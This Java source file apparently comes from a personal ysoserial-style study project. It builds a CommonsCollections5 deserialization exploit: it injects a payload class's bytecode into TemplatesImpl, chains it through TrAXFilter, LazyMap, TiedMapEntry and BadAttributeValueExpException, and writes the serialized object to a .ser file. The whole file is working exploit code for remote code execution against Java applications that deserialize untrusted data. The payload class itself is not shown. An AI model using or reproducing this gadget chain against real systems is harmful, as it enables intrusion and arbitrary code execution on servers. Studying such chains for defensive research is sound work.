package CommonsCollections5;

import CommonsCollections4.payload;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class exp1 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, NotFoundException, CannotCompileException, ClassNotFoundException {
        TemplatesImpl tmp = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload.class));
        CtClass pay_class = pool.get(payload.class.getName());
        byte[] payCode = pay_class.toBytecode();
        Class clazz;
        clazz =Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        //存储payload类
        Field byteCode = clazz.getDeclaredField("_bytecodes");
        byteCode.setAccessible(true);
        byteCode.set(tmp,new byte[][]{payCode});
        Field name  = clazz.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmp,"tr1ple");

        //构造内部的转换链
        Transformer[] trans = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{tmp}
                )
        };
        ChainedTransformer chian = new ChainedTransformer(trans);

        HashMap map = new HashMap();
        Map innerMap = LazyMap.decorate(map,chian);
        //构造外部的触发链
        TiedMapEntry entry = new TiedMapEntry(innerMap, "tr1ple");

        BadAttributeValueExpException val  = new BadAttributeValueExpException(null);
        Field valField = val.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(val,entry);

        //序列化
        File file;
        file =new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commonscollections5.ser");
        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(file));
        obj.writeObject(val);

    }
}
